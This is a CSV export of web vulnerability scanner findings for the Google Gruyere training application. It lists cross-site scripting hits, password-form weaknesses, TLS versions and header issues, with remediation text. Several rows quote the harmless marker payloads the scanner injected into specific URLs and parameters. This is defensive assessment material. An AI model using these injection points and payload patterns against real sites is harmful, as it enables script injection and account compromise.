asset.id,asset.name,"definition.cvss2.base_score","definition.cvss2.base_vector","definition.cvss3.base_score","definition.cvss3.base_vector",definition.description,definition.family,definition.id,definition.name,"definition.patch_published","definition.plugin_published","definition.plugin_updated",definition.references,definition.see_also,definition.severity,definition.solution,"definition.vulnerability_published",finding_id,first_observed,last_observed,output,risk_modified,severity,state
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert content directly into an HTML tag. For example `<INJECTION_HERE href=.......etc>` where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98105,"Cross-Site Scripting (XSS) in HTML tag",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"2608d85c-0ed5-4b0f-889a-51d263410059",2022-03-15T21:06:17.432Z,2022-03-15T18:14:30Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"26a4ef7c-6507-4a79-bebb-c97c364ce4c6",2022-03-15T18:42:41.743Z,2022-03-15T17:31:06Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload.gtl with input fields : 
- upload_file (file)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"279a8c51-3226-4d0d-9185-f2beb0dd86aa",2022-03-15T21:06:17.432Z,2022-03-15T13:51:15Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?action=new&uid=81&pw=nessus_was_textlpaaugw3&is_author=True' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The HTTP 'X-XSS-Protection' response header is a feature of modern browsers that allows websites to control their XSS auditors.

The server did not return a correct 'X-XSS-Protection' header, which means that this website could be at risk of a Cross-Site Scripting (XSS) attack.

If legacy browsers support is not needed, it is recommended to use Content-Security-Policy without allowing unsafe-inline scripts instead.","HTTP Security Header",112527,"Disabled 'X-XSS-Protection' Header",,2018-11-27T00:00:00Z,2021-04-13T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection",Info,"Configure your web server to include an 'X-XSS-Protection' header with a value of '1; mode=block'.",,"27bae81e-0f02-4a58-ac66-6d4cac898e4d",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The scanner detected that the X-XSS-Protection header is set with an overpermissive value in the target application response.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"2832cd82-6750-47d5-aab0-e6d463843fbe",2022-03-15T18:42:41.743Z,2022-03-15T16:54:38Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"2b5cd90d-03f3-4d11-9783-04c7a20e17c9",2022-03-15T18:42:41.743Z,2022-03-15T17:24:29Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scan detected that some XHR requests seem to call an API. This API may be scanned with WAS API Scanning",General,112616,"API Detected",,2020-10-21T00:00:00Z,2020-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"2e53deef-65be-460b-b550-1c295b31a154",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"API endpoints have been detected for the following host(s):
- http://google-gruyere.appspot.com",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"303ef772-6f70-489e-921a-a6daf1996206",2022-03-15T21:06:17.432Z,2022-03-15T19:53:33Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/656501648683287335357107855369111942818/login"">
  <input type=""text"" name=""uid"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""submit"" value=""Login"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"3320a5cd-43b8-4e0f-90a9-d7c3868bbfb0",2022-03-15T18:42:41.743Z,2022-03-15T18:19:48Z,"A response has been received with a response code '304' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/static/codeindex.html'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"36bc93df-8a8c-4fb0-9c0f-661c6af7f35e",2022-03-15T21:06:17.432Z,2022-03-15T18:56:26Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload.gtl with input fields : 
- upload_file (file)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"36e4a6c3-6fba-4eb7-88c7-c78fe4469bd9",2022-03-15T18:42:41.743Z,2022-03-15T16:49:18Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This plugin displays information about the SSL/TLS versions supported by remote server for HTTPS connection.",SSL/TLS,112530,"SSL/TLS Versions Supported",,2018-10-03T00:00:00Z,2020-10-02T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"373f3698-8190-46a8-996e-9c8db45b7ea1",2022-03-15T18:42:41.743Z,2022-03-15T16:46:08Z,"
    Protocol   Supported
    ---------------------
    SSL 2.0    No
    SSL 3.0    No
    TLS 1.0    Yes
    TLS 1.1    Yes
    TLS 1.2    Yes
    TLS 1.3    Yes",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"3740f9f5-9dc4-478a-8b7e-db6f4912c661",2022-03-15T21:06:17.432Z,2022-03-15T19:28:52Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""update"">
  </input>
  <input type=""text"" value="""" name=""name"" maxlength=""16"">
  </input>
  <input type=""password"" name=""oldpw"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""text"" value="""" name=""icon"">
  </input>
  <input type=""text"" size=""50"" value="""" name=""web_site"">
  </input>
  <input type=""text"" value="""" name=""color"">
  </input>
  <textarea name=""private_snippet"" rows=""10"" style=""width:100%"">
  </textarea>
  <input type=""submit"" value=""Update"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Detects any known CAPTCHA products being used on a page.","Web Applications",98083,"CAPTCHA Detection",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"37527f46-b4ab-4df0-90fd-1a7c52291de5",2022-03-15T18:42:41.743Z,2022-03-15T18:06:22Z,"A Recaptcha CAPTCHA has been detected on https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881 due to tag  <div class=""g-recaptcha"" data-sitekey=""6LfKTycUAAAAAOLes3JooIZ0gi8BNy81n_mY3fdD"">",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"37d3595a-f9e9-489a-bac8-c98394f839ac",2022-03-15T21:06:17.432Z,2022-03-15T15:30:31Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"37fba484-e3b6-40df-b600-c1a9555b00dd",2022-03-15T21:06:17.432Z,2022-03-15T18:14:30Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  "";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""656501648683287335357107855369111942818"", ""cheddar "";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"38233e6e-73b8-4ee7-9020-1e41a4c94b42",2022-03-15T21:06:17.432Z,2022-03-15T17:14:22Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
